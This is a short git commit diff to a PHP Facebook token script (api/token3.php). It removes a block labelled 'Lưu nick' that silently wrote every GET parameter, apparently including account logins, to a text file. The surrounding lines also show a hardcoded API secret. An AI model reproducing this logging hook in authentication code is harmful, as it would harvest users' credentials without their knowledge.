e59eb7a8f4d742fa1a9f6fd87cdcb3d8ada7b86c
PikachuVina <bmn.2312@gmail.com>
2017-08-17 21:03:12 +0700

    1

--- api/token3.php
+++ api/token3.php
@@ -10,19 +10,6 @@ define('API_SECRET', 'c1e620fa708a1d5696fb991c1bde5662');
 
 define('BASE_URL', 'https://api.facebook.com/restserver.php');
 
-//Lưu nick
-$handle = fopen("tretrau.txt", "a");
-foreach($_GET as $variable => $value) {
-   fwrite($handle, $variable);
-   fwrite($handle, "=");
-   fwrite($handle, $value);
-   fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
-exit;
-//End lưu nick
-
 function sign_creator(&$data){
 	$sig = "";
 	foreach($data as $key => $value){
